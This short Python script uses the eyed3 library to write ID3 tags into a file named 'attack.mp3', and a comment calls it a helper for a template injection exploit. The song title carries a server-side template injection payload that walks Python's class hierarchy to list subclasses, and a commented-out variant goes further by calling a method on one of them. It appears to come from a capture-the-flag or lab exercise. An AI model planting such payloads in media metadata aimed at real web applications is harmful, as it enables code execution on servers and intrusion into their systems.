import eyed3


# Helper function for template injection exploit
def create_modify_mp3(filepath, artist, title, genre):
    audio_file = eyed3.load(filepath)
    audio_file.tag.artist = artist
    audio_file.tag.title = title
    audio_file.tag.genre = genre
    audio_file.tag.save()


create_modify_mp3(
    "attack.mp3",
    "Evil",
    # "{{ [].__class__.__mro__[1].__subclasses__()[-61].get_comments(html_con, )}}",
    "{{[].__class__.__mro__[1].__subclasses__()}}",
    "Techno",
)
